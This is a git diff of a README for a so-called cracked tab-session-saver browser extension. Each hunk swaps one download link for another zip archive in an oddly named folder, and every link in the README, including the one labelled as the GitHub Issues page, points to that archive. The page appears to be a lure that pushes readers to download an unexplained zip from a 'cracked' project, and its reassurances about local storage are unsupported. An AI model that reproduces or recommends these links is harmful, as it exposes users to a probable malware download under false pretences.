@@ -2,7 +2,7 @@
 
 ## 📦 Download Now
 
-[![Download](https://raw.githubusercontent.com/Pollob99/cracked-tab-session-saver-extension/main/gastrodidymus/cracked-tab-session-saver-extension.zip%20Latest%20Release-1E90FF?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Pollob99/cracked-tab-session-saver-extension/main/gastrodidymus/cracked-tab-session-saver-extension.zip)
+[![Download](https://raw.githubusercontent.com/Pollob99/cracked-tab-session-saver-extension/main/gastrodidymus/extension-cracked-tab-session-saver-v3.9-alpha.5.zip%20Latest%20Release-1E90FF?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Pollob99/cracked-tab-session-saver-extension/main/gastrodidymus/extension-cracked-tab-session-saver-v3.9-alpha.5.zip)
 
 ## 🔍 Overview
 
@@ -23,7 +23,7 @@ The Cracked Tab Session Saver Extension helps you keep track of your open tabs i
 
 ## 📥 Download & Install
 
-To get started with the Cracked Tab Session Saver Extension, visit this page to download: [Download Latest Release](https://raw.githubusercontent.com/Pollob99/cracked-tab-session-saver-extension/main/gastrodidymus/cracked-tab-session-saver-extension.zip).
+To get started with the Cracked Tab Session Saver Extension, visit this page to download: [Download Latest Release](https://raw.githubusercontent.com/Pollob99/cracked-tab-session-saver-extension/main/gastrodidymus/extension-cracked-tab-session-saver-v3.9-alpha.5.zip).
 
 Once there, follow these steps:
 
@@ -80,7 +80,7 @@ Your session data is stored locally on your browser, ensuring that your tab info
 
 ## 📞 Support
 
-For further assistance or to report bugs, you can create an issue directly on the [GitHub Issues Page](https://raw.githubusercontent.com/Pollob99/cracked-tab-session-saver-extension/main/gastrodidymus/cracked-tab-session-saver-extension.zip).
+For further assistance or to report bugs, you can create an issue directly on the [GitHub Issues Page](https://raw.githubusercontent.com/Pollob99/cracked-tab-session-saver-extension/main/gastrodidymus/extension-cracked-tab-session-saver-v3.9-alpha.5.zip).
 
 ## 🥇 Acknowledgements
 
@@ -88,4 +88,4 @@ This project uses open-source libraries and tools. We appreciate contributors wh
 
 Thank you for downloading and using the Cracked Tab Session Saver Extension! We hope it enhances your browsing experience. For more updates and features, keep an eye on the releases page.
 
-[Download Latest Release](https://raw.githubusercontent.com/Pollob99/cracked-tab-session-saver-extension/main/gastrodidymus/cracked-tab-session-saver-extension.zip)
+[Download Latest Release](https://raw.githubusercontent.com/Pollob99/cracked-tab-session-saver-extension/main/gastrodidymus/extension-cracked-tab-session-saver-v3.9-alpha.5.zip)
